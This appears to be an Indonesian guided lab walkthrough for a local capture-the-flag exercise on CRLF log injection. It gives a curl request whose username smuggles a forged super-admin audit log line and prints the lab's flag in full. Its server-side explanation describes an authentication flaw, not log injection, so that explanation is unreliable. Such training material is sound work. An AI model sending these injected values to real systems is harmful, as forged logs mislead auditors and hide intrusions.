# Panduan Praktik Terbimbing: Investigasi CRLF Log Injection & Log Forgery

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **AuditSys Central** pada `http://127.0.0.1:8057`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8057/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A09-02","port":8057,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8057/`
3. Amati antarmuka operasional **AuditSys Central** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (CRLF Log Injection & Log Forgery)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -X POST http://127.0.0.1:8057/api/login -d '{"username":"admin\r\n[SECURITY_AUDIT] SUCCESSFUL_LOGIN role=super_admin"}'
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Content-Type: application/json` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8057/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8057/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A09-02","flag":"ZITERA{cr1f_l0g_1nj3ct10n_f0rg3ry_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{cr1f_l0g_1nj3ct10n_f0rg3ry_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
